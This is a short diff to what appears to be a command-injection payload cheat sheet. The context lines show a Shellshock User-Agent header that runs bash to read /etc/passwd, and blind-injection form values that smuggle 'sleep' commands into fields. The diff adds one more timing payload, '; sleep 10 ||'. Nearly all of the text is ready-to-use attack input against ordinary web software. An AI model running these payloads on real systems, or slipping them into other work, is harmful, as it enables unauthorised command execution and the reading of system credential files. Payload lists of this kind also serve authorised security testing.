@@ -22,6 +22,8 @@ User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent He
 ## Blind injection
 Example:  name=test&email=```;sleep 5;```&message=test or, name=test&email=```||sleep 5||```&message=test
 ```sh
+; sleep 10 ||
+
 & sleep 10 #
 
 ; sleep 10 ;
